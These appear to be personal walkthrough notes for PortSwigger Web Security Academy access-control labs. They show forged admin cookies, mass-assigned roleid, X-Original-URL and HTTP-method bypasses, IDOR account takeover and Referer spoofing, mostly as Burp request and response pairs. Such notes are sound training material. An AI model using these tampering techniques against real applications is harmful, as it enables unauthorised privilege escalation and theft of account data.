# Portswigger
## Access Control Vulnerabilities
### Unprotected admin functionality
```bash

# This lab has an unprotected admin panel.

# Solve the lab by deleting the user carlos. 

Go to:

https://ac5b1fa81fb983ccc0bb230f00910047.web-security-academy.net/robots.txt

User-agent: *
Disallow: /administrator-panel

Go to:

https://ac5b1fa81fb983ccc0bb230f00910047.web-security-academy.net/administrator-panel

Delete the username "carlos"

```

### Unprotected admin functionality with unpredictable URL
```bash

#  This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

# Solve the lab by accessing the admin panel, and using it to delete the user carlos. 

Go to: "My account"
View page source code

Locate the isAdmin variable and read if statement with the admin end-point within

'/admin-s7p562'

Go to:

https://ac521f411f4cf522c1440f90004e00b8.web-security-academy.net/admin-s7p562

Delete the username "carlos"

```

![[Pasted image 20220513200029.png]]

### User role controlled by request parameter
```bash

# This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.

# Solve the lab by accessing the admin panel and using it to delete the user carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Attempt to access

https://ac141f401fee3b17c0471c99009f00fc.web-security-academy.net/admin

Followed by a GET request of:

GET /admin HTTP/1.1

Cookie: session=FXhMokS0myZHILr6znWh5a3MQeVlk6EO; Admin=false

Post request of:

HTTP/1.1 401 Unauthorized

Send to repeater

Change:

Cookie: session=FXhMokS0myZHILr6znWh5a3MQeVlk6EO; Admin=false

To

Cookie: session=FXhMokS0myZHILr6znWh5a3MQeVlk6EO; Admin=true

Response:

HTTP/1.1 200 OK

Go to this page and delete the username "carlos"
Upon failure
Go to: HTTP history

GET /admin/delete?username=carlos HTTP/1.1

Send to repeater

Change

Cookie: session=FXhMokS0myZHILr6znWh5a3MQeVlk6EO; Admin=false

To

Cookie: session=FXhMokS0myZHILr6znWh5a3MQeVlk6EO; Admin=true

```

![[Pasted image 20220513200709.png]]

![[Pasted image 20220513200638.png]]

### User role can be modified in user profile
```bash

# This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2.

# Solve the lab by accessing the admin panel and using it to delete the user carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: "My account"
Intercept is on
Change email to preferred choice
Send the POST request to repeater

POST /my-account/change-email HTTP/1.1

Change:

{
"email":"email@email.com"
}

To

{
  "username": "wiener",
  "email": "email@email.com",
  "apikey": "cSkfx78SDuHLcovS8PBSOzE9tkXhvqZk",
  "roleid": 2
}

Note the response now signifies a roleid of "2"

HTTP/1.1 302 Found

"roleid": 2

Go to:

ac611f9c1f58d205c19b3a7a00820069.web-security-academy.net/admin

```

![[Pasted image 20220513202751.png]]

![[Pasted image 20220513202826.png]]

### URL-based access control can be circumvented
```bash

# This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

# To solve the lab, access the admin panel and delete the user carlos. 

Go to:

https://ac791f081eb8a033c0a92e6d00c8000f.web-security-academy.net/admin

"Access denied"

Go to: HTTP history
Find:

GET /admin HTTP/1.1

Send to repeater

Change 

GET /admin HTTP/1.1

To

GET / HTTP/1.1

Insert (make sure it is above 'Connection: close' ): 

X-Original-URL: /admin

Note the response:

HTTP/1.1 200 OK

Delete the username "carlos"

Upon failure
Go to: HTTP history
Find:

GET /admin/delete?username=carlos HTTP/1.1

Send to repeater

Change:

GET /admin/delete?username=carlos HTTP/1.1

To

GET /?username=carlos HTTP/1.1

Insert (make sure it is above 'Connection: close' ):

X-Original-URL: /admin/delete

After sending this request the username "carlos" should be deleted

```

![[Pasted image 20220513205624.png]]

![[Pasted image 20220513205652.png]]

![[Pasted image 20220513210446.png]]

![[Pasted image 20220513210215.png]]

### Method-based access control can be circumvented
```bash

# This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

# To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 

Log in as administrator:admin
Go to: "Admin panel"
Intercept is on
Upgrade the account "carlos"
Send to repeater
Log off and re-log as wiener:peter
Take the cookie for username "wiener" and replace it in the previous request sent to repeater

POST /admin-roles HTTP/1.1

Response:

HTTP/1.1 401 Unauthorized

"Unauthorized"

Change

POST /admin-roles HTTP/1.1

To

POSTX /admin-roles HTTP/1.1

Response:

HTTP/1.1 400 Bad Request

"Missing parameter 'username'"

Right-click the POSTX request and select "Change request method"

Change:

GET /admin-roles?username=carlos&action=upgrade HTTP/1.1

To

GET /admin-roles?username=wiener&action=upgrade HTTP/1.1

```

![[Pasted image 20220514001023.png]]

![[Pasted image 20220514001101.png]]

![[Pasted image 20220514001145.png]]

![[Pasted image 20220514001213.png]]

![[Pasted image 20220514001248.png]]

![[Pasted image 20220514001323.png]]

![[Pasted image 20220514001352.png]]

### User ID controlled by request parameter
```bash

# This lab has a horizontal privilege escalation vulnerability on the user account page.

# To solve the lab, obtain the API key for the user carlos and submit it as the solution.

# You can log in to your own account using the following credentials: wiener:peter 

Go to: HTTP history
Find:

GET /my-account?id=wiener HTTP/1.1

Response:

HTTP/1.1 200 OK

'Your username is: wiener'

'Your API Key is: WlxRukVW4yBQzQlFs2QMPi6AI0a76GZb'

Send to repeater
Change username "wiener" to "carlos"

GET /my-account?id=carlos HTTP/1.1

HTTP/1.1 200 OK

'Your username is: carlos'

'Your API Key is: FtOCOI8mDBCiQ6y3LkfpyuktADoS0a1E'

```

![[Pasted image 20220514002024.png]]

![[Pasted image 20220514002057.png]]

### User ID controlled by request parameter, with unpredictable user IDs
```bash

# This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

# To solve the lab, find the GUID for carlos, then submit his API key as the solution.

# You can log in to your own account using the following credentials: wiener:peter 

Login to wiener:peter
Go to: "Home"
Search through the blogs and find the username "carlos" who created the "Hobbies" blog
Intercept is on
Click "carlos"
Send to repeater or take note of the "id"

GET /blogs?userId=a49108c2-b1c8-4126-95a5-67df0a5c5971 HTTP/1.1

Click "My account" or browse through the history until you find

GET /my-account?id=f56d2e64-7afe-44dc-92ca-595973ffa7d2 HTTP/1.1

With a response of:

'Your username is: wiener'

'Your API Key is: JM1fdP1QImFYurVRnrg6i9djNEp6MaAQ'

Send to repeater

Change the id of "wiener" to the id of "carlos"

GET /my-account?id=f56d2e64-7afe-44dc-92ca-595973ffa7d2 HTTP/1.1

To

GET /my-account?id=a49108c2-b1c8-4126-95a5-67df0a5c5971 HTTP/1.1

'Your username is: carlos'

'Your API Key is: PmfYjZp2YEte4IyRggSM5f0uqHFxccvY0'

```


![[Pasted image 20220514003253.png]]

![[Pasted image 20220514003347.png]]

![[Pasted image 20220514003641.png]]

![[Pasted image 20220514003530.png]]

### User ID controlled by request parameter with data leakage in redirect
```bash

# This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.

# To solve the lab, obtain the API key for the user carlos and submit it as the solution.

# You can log in to your own account using the following credentials: wiener:peter 

Log in as wiener:peter
Note the end-point

https://ac1b1fdf1f55abf5c0edd61e001100a8.web-security-academy.net/my-account?id=wiener

Intercept is on
Try:

https://ac1b1fdf1f55abf5c0edd61e001100a8.web-security-academy.net/my-account?id=carlos

Request:

GET /my-account?id=carlos HTTP/1.1

Response:

HTTP/1.1 302 Found

'Your username is: carlos'

'Your API Key is: VaVyLwaOBhV2taUYAyNGyXcmNwiGLF2z'

```

![[Pasted image 20220514004843.png]]

### User ID controlled by request parameter with password disclosure
```bash

# This lab has user account page that contains the current user's existing password, prefilled in a masked input.

# To solve the lab, retrieve the administrator's password, then use it to delete carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Log in as wiener:peter
Go to:

https://ac011f1f1e0642f5c0b4c753004400dd.web-security-academy.net/admin

Note the name "administrator"
Go to Home:
Intercept is on
Refresh the page
Note in the response you can see the cleartext password
Note the end-point:

https://ac011f1f1e0642f5c0b4c753004400dd.web-security-academy.net/my-account?id=wiener

Change to:

https://ac011f1f1e0642f5c0b4c753004400dd.web-security-academy.net/my-account?id=administrator

Response:

HTTP/1.1 200 OK

'Your username is: administrator'

<input required type=password name=password value='jluw9vw1ssrk9pvaokv2'/>

Login as administrator:jluw9vw1ssrk9pvaokv2

Delete the username "carlos"

```

![[Pasted image 20220514005259.png]]

![[Pasted image 20220514010344.png]]

### Insecure direct object references
```bash

# This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

# Solve the lab by finding the password for the user carlos, and logging into their account. 

Go to: "Live chat"
Send any message
Note the end-point:

GET /download-transcript/2.txt HTTP/1.1

Response:

"Whatever you sent"

Send to repeater
Change:

GET /download-transcript/2.txt HTTP/1.1

to

GET /download-transcript/1.txt HTTP/1.1

The response contains the password

```

![[Pasted image 20220514200914.png]]

![[Pasted image 20220514200945.png]]

### Multi-step process with no access control on one step
```bash

# This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

# To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 

Login with administrator:admin
Go to: "Admin panel"
Intercept is on

POST /admin-roles HTTP/1.1

username=carlos&action=upgrade

Send to repeater

POST /admin-roles HTTP/1.1

action=upgrade&confirmed=true&username=wiener

Send to repeater

Go to: "Logout"
Login as wiener:peter
Go to: HTTP history
Find:

GET /my-account HTTP/1.1

Cookie: session=jHCbbrD4jaPFkIj2gJ3Pk4PD4GNvEbsF

Take the cookie from username "wiener"
Go to:

POST /admin-roles HTTP/1.1

Change:

action=upgrade&confirmed=true&username=carlos

To

action=upgrade&confirmed=true&username=wiener

Note the response:

HTTP/1.1 302 Found

```

![[Pasted image 20220514202654.png]]

![[Pasted image 20220514202721.png]]

![[Pasted image 20220514202810.png]]

![[Pasted image 20220514202838.png]]

![[Pasted image 20220514202909.png]]

### Referer-based access control
```bash

# This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

# To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 

Log in as administrator:admin
Go to: "Admin Panel"
Intercept is on
Upgrade the username "carlos" to administrator
Send to repeater
Intercept is off
Go to: "Log out"
Log in as wiener:peter
Go to: HTTP History

GET /my-account HTTP/1.1

Copy the cookie for username "wiener"

Go to: Repeater

Change:

GET /admin-roles?username=carlos&action=upgrade HTTP/1.1

To

GET /admin-roles?username=wiener&action=upgrade HTTP/1.1

Change the cookie to reflect the username "carlos"

Note the response:

HTTP/1.1 302 Found

```

![[Pasted image 20220514203646.png]]

![[Pasted image 20220514203741.png]]

![[Pasted image 20220514203820.png]]

![[Pasted image 20220514203852.png]]

![[Pasted image 20220514203928.png]]

#hacking
